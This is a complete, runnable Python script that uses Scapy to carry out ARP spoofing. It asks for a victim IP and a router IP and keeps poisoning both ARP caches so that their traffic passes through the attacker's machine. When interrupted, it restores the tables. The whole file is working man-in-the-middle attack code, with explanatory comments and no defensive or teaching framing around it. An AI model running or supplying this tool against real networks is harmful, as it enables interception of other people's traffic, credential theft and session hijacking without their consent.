#! /usr/bin/python3

from scapy.all import *
import time
import sys
import os # For root check

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast_ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_ether/arp_request

    # Send and receive packets at layer 2.
    # Increase timeout and add retries for more reliability
    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)

    if answered_list:
        # We expect one answer normally.
        # answered_list[0] is a pair: (sent_packet, received_packet)
        # received_packet is answered_list[0][1]
        # hwsrc is the source MAC address from the ARP reply
        return answered_list[0][1].hwsrc
    else:
        print(f"\n[-] Could not get MAC address for {ip}. Host might be down or not responding to ARP.")
        return None

def restore_arptable(victim_ip, router_ip):
    print(f"\n[*] Attempting to restore ARP tables for victim {victim_ip} and router {router_ip}...")
    victim_mac = get_mac(victim_ip)
    router_mac = get_mac(router_ip)

    if victim_mac and router_mac:
        # Tell victim the router's true MAC
        print(f"[+] Restoring ARP for victim ({victim_ip}) about router ({router_ip} at {router_mac})")
        arp_response_to_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
        send(arp_response_to_victim, count=4, verbose=False)

        # Tell router the victim's true MAC
        print(f"[+] Restoring ARP for router ({router_ip}) about victim ({victim_ip} at {victim_mac})")
        arp_response_to_router = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac)
        send(arp_response_to_router, count=4, verbose=False)
        print("[+] ARP restoration packets sent.")
    else:
        if not victim_mac:
            print(f"[-] Failed to get MAC for victim {victim_ip}. Cannot fully restore its ARP table entry regarding the router.")
        if not router_mac:
            print(f"[-] Failed to get MAC for router {router_ip}. Cannot fully restore its ARP table entry regarding the victim.")
        print("[-] ARP table restoration might be incomplete.")


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print(f"\n[-] Failed to get MAC for {target_ip}. Skipping spoof for this target in this iteration.")
        return False # Indicate failure for this attempt

    # We are telling target_ip that spoof_ip is at our MAC address
    # Scapy will use the MAC of the sending interface for hwsrc by default if not specified
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # The Ether layer's src MAC will also be filled by scapy from the interface
    packet = Ether(dst=target_mac)/arp_response
    sendp(packet, verbose=False) # sendp for layer 2
    return True # Indicate success

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root.")
        sys.exit(1)

    tip = input("Enter IP of the victim: ")
    rip = input("Enter IP of the router to spoof: ")

    print(f"\n[*] ARP Spoofing. Target: {tip}, Router: {rip}")
    print("[*] Press Ctrl+C to stop and restore ARP tables.")

    packets_sent_count = 0
    try:
        while True:
            spoof_victim_success = spoof(tip, rip)  # Tell victim (tip) that router (rip) is at our MAC
            spoof_router_success = spoof(rip, tip)  # Tell router (rip) that victim (tip) is at our MAC

            if spoof_victim_success and spoof_router_success:
                packets_sent_count += 2
                print(f"\r[*] Packets Sent: {packets_sent_count}", end="", flush=True)
            else:
                # If a spoof failed, print a new line so the error messages from get_mac/spoof are visible
                print("", flush=True)
                # You might want to pause longer or implement a retry mechanism for get_mac here
                # For now, it will just try again in the next loop iteration.

            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[+] Ctrl+C detected. Stopping ARP spoofer and restoring ARP tables...")
    except Exception as e:
        print(f"\n[-] An unexpected error occurred in the main loop: {e}")
    finally:
        # This block will execute whether the try block completes normally,
        # or an exception (like KeyboardInterrupt or other) occurs.
        restore_arptable(tip, rip)
        # restore_arptable(rip, tip) # The function restore_arptable(tip, rip) handles both directions.
        print("[+] ARP Spoofer shutdown complete.")
